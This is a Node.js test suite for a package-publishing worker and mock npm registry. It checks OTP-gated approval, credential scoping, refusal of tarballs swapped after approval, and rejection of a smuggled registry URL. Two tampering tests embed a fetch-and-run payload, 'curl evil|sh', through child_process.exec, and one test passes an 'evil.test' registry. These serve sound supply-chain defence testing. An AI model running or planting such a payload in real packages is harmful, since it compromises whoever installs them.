import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { existsSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import { startRegistry, totp } from './registry.mjs';
import { makePackage, sha256 } from './tarball.mjs';

const BOT = 'bot-token-for-tests';
const CI = 'ci-token-for-tests';
const SECRET = 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ';

let reg;
before(async () => {
  reg = await startRegistry({ botToken: BOT, ciToken: CI, totpSecret: SECRET });
});
after(() => reg.close());

const auth = (t) => ({ authorization: `Bearer ${t}` });

async function stage(name, version, source) {
  const tarball = makePackage(name, version, source);
  const r = await fetch(`${reg.url}/-/mock/stage`, {
    method: 'POST',
    headers: { ...auth(CI), 'content-type': 'application/json' },
    body: JSON.stringify({ name, version, tarball: tarball.toString('base64') }),
  });
  assert.equal(r.status, 201);
  return { id: (await r.json()).id, tarball };
}

const approve = (id, token, otp) =>
  fetch(`${reg.url}/-/stage/${id}/approve`, {
    method: 'POST',
    headers: { ...auth(token), ...(otp ? { 'npm-otp': otp } : {}) },
  });

test('a stage-only credential cannot approve', async () => {
  const { id } = await stage('mock-a', '1.0.0');
  const r = await approve(id, CI, totp(SECRET));
  assert.equal(r.status, 403);
  assert.equal(reg.isPublished('mock-a', '1.0.0'), false);
});

test('approval without a one-time password is refused', async () => {
  const { id } = await stage('mock-b', '1.0.0');
  assert.equal((await approve(id, BOT)).status, 401);
  assert.equal((await approve(id, BOT, '000000')).status, 401);
  assert.equal(reg.isPublished('mock-b', '1.0.0'), false);
});

test('the bot with a valid password publishes, and the tarball is served back', async () => {
  const { id, tarball } = await stage('mock-c', '1.0.0');
  assert.equal((await approve(id, BOT, totp(SECRET))).status, 200);
  assert.equal(reg.isPublished('mock-c', '1.0.0'), true);
  const meta = await (await fetch(`${reg.url}/mock-c/1.0.0`)).json();
  const body = Buffer.from(await (await fetch(meta.dist.tarball)).arrayBuffer());
  assert.equal(sha256(body), sha256(tarball));
});

test('scoped package metadata is found through an encoded slash', async () => {
  const { id } = await stage('@acme/util', '2.0.0');
  assert.equal((await approve(id, BOT, totp(SECRET))).status, 200);
  const r = await fetch(`${reg.url}/@acme%2futil/2.0.0`);
  assert.equal(r.status, 200);
});

test('unauthenticated requests cannot read staged tarballs', async () => {
  const { id } = await stage('mock-d', '1.0.0');
  assert.equal((await fetch(`${reg.url}/-/stage/${id}/tarball`)).status, 401);
});

const workerBin = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  '../worker/target/debug/keyturn-worker' + (process.platform === 'win32' ? '.exe' : ''),
);

// The mock registry lives in this process, so the worker must run without
// blocking the event loop.
function runWorker(input, env = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(workerBin, [], {
      env: { ...process.env, NPM_TOKEN: BOT, NPM_TOTP_SECRET: SECRET, KEYTURN_NPM_REGISTRY: reg.url, ...env },
    });
    let stdout = '';
    child.stdout.on('data', (d) => (stdout += d));
    child.on('error', reject);
    child.on('close', (code) => resolve({ code, out: JSON.parse(stdout) }));
    child.stdin.end(JSON.stringify(input));
  });
}

test('worker binary publishes the approved bytes', { skip: !existsSync(workerBin) }, async () => {
  const { id, tarball } = await stage('mock-e', '1.0.0');
  const { code, out } = await runWorker({ stage_id: id, package: 'mock-e', version: '1.0.0', approved_hash: sha256(tarball) });
  assert.equal(out.error, null);
  assert.equal(code, 0);
  assert.equal(out.ok, true);
  assert.equal(out.published_hash, sha256(tarball));
  assert.equal(reg.isPublished('mock-e', '1.0.0'), true);
});

test('worker binary refuses bytes swapped after approval', { skip: !existsSync(workerBin) }, async () => {
  const { id, tarball } = await stage('mock-f', '1.0.0');
  const approved = sha256(tarball);
  const evil = makePackage('mock-f', '1.0.0', "require('child_process').exec('curl evil|sh')");
  await fetch(`${reg.url}/-/mock/tamper/${id}`, {
    method: 'POST',
    body: JSON.stringify({ tarball: evil.toString('base64') }),
  });
  const { code, out } = await runWorker({ stage_id: id, package: 'mock-f', version: '1.0.0', approved_hash: approved });
  assert.equal(code, 2);
  assert.equal(out.error, 'hash_mismatch');
  assert.equal(reg.isPublished('mock-f', '1.0.0'), false);
});

test('worker binary fails when the one-time seed is wrong', { skip: !existsSync(workerBin) }, async () => {
  const { id, tarball } = await stage('mock-g', '1.0.0');
  const { code, out } = await runWorker(
    { stage_id: id, package: 'mock-g', version: '1.0.0', approved_hash: sha256(tarball) },
    { NPM_TOTP_SECRET: 'MFRGGZDFMFRGGZDFMFRGGZDF' },
  );
  assert.equal(code, 2);
  assert.equal(out.error, 'approve_failed');
  assert.equal(reg.isPublished('mock-g', '1.0.0'), false);
});

// ----- direct publish mode -----

async function artifact(tarball) {
  const r = await fetch(`${reg.url}/-/mock/artifact`, {
    method: 'POST',
    headers: auth(CI),
    body: JSON.stringify({ tarball: tarball.toString('base64') }),
  });
  assert.equal(r.status, 201);
  return r.json();
}

test('artifacts are served without credentials and can be tampered with', async () => {
  const bytes = makePackage('art-a', '1.0.0');
  const { id, url } = await artifact(bytes);
  const got = Buffer.from(await (await fetch(url)).arrayBuffer());
  assert.equal(sha256(got), sha256(bytes));
  const evil = makePackage('art-a', '1.0.0', 'evil();');
  await fetch(`${reg.url}/-/mock/tamper-artifact/${id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
  const again = Buffer.from(await (await fetch(url)).arrayBuffer());
  assert.equal(sha256(again), sha256(evil));
});

test('a stage-only credential cannot publish directly', async () => {
  const r = await fetch(`${reg.url}/direct-a`, { method: 'PUT', headers: auth(CI), body: '{}' });
  assert.equal(r.status, 403);
  assert.equal((await fetch(`${reg.url}/direct-a`, { method: 'PUT', body: '{}' })).status, 401);
});

const workerEnvHttp = { KEYTURN_ALLOW_HTTP: '1' };

test('worker publish mode publishes the approved artifact', { skip: !existsSync(workerBin) }, async () => {
  const bytes = makePackage('direct-b', '1.0.0');
  const { url } = await artifact(bytes);
  const { code, out } = await runWorker(
    { mode: 'publish', package: 'direct-b', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url },
    workerEnvHttp,
  );
  assert.equal(out.error, null, out.detail);
  assert.equal(code, 0);
  assert.equal(out.published_hash, sha256(bytes));
  assert.equal(sha256(reg.publishedTarball('direct-b', '1.0.0')), sha256(bytes));
});

test('worker publish mode publishes a scoped package', { skip: !existsSync(workerBin) }, async () => {
  const bytes = makePackage('@acme/direct-c', '2.0.0');
  const { url } = await artifact(bytes);
  const { out } = await runWorker(
    { mode: 'publish', package: '@acme/direct-c', version: '2.0.0', approved_hash: sha256(bytes), artifact_url: url },
    workerEnvHttp,
  );
  assert.equal(out.ok, true, out.detail);
  assert.equal(reg.isPublished('@acme/direct-c', '2.0.0'), true);
});

test('worker publish mode refuses an artifact swapped after approval', { skip: !existsSync(workerBin) }, async () => {
  const bytes = makePackage('direct-d', '1.0.0');
  const { id, url } = await artifact(bytes);
  const approved = sha256(bytes);
  const evil = makePackage('direct-d', '1.0.0', "require('child_process').exec('curl evil|sh')");
  await fetch(`${reg.url}/-/mock/tamper-artifact/${id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
  const { code, out } = await runWorker(
    { mode: 'publish', package: 'direct-d', version: '1.0.0', approved_hash: approved, artifact_url: url },
    workerEnvHttp,
  );
  assert.equal(code, 2);
  assert.equal(out.error, 'hash_mismatch');
  assert.equal(reg.isPublished('direct-d', '1.0.0'), false);
});

test('a repeated publish request confirms the existing version instead of publishing again', { skip: !existsSync(workerBin) }, async () => {
  const bytes = makePackage('direct-e', '1.0.0');
  const { url } = await artifact(bytes);
  const req = { mode: 'publish', package: 'direct-e', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url };
  assert.equal((await runWorker(req, workerEnvHttp)).out.ok, true);
  const second = await runWorker(req, workerEnvHttp);
  assert.equal(second.out.ok, true);
  assert.equal(second.out.published_hash, sha256(bytes));
});

test('worker never overwrites a version that exists with other bytes', { skip: !existsSync(workerBin) }, async () => {
  const first = makePackage('direct-h', '1.0.0');
  const other = makePackage('direct-h', '1.0.0', 'different();');
  const a1 = await artifact(first);
  assert.equal((await runWorker({ mode: 'publish', package: 'direct-h', version: '1.0.0', approved_hash: sha256(first), artifact_url: a1.url }, workerEnvHttp)).out.ok, true);
  const a2 = await artifact(other);
  const r = await runWorker({ mode: 'publish', package: 'direct-h', version: '1.0.0', approved_hash: sha256(other), artifact_url: a2.url }, workerEnvHttp);
  assert.equal(r.out.ok, false);
  assert.equal(r.out.error, 'version_exists');
});

test('worker refuses plain http artifacts unless the operator allows them', { skip: !existsSync(workerBin) }, async () => {
  const bytes = makePackage('direct-f', '1.0.0');
  const { url } = await artifact(bytes);
  const { out } = await runWorker({ mode: 'publish', package: 'direct-f', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url });
  assert.equal(out.error, 'bad_input');
  assert.equal(reg.isPublished('direct-f', '1.0.0'), false);
});

test('worker rejects an unknown mode and a smuggled registry', { skip: !existsSync(workerBin) }, async () => {
  assert.equal((await runWorker({ mode: 'sudo' })).out.error, 'bad_input');
  const bytes = makePackage('direct-g', '1.0.0');
  const { url } = await artifact(bytes);
  const r = await runWorker(
    { mode: 'publish', package: 'direct-g', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url, registry_url: 'https://evil.test' },
    workerEnvHttp,
  );
  assert.equal(r.out.error, 'bad_input');
});
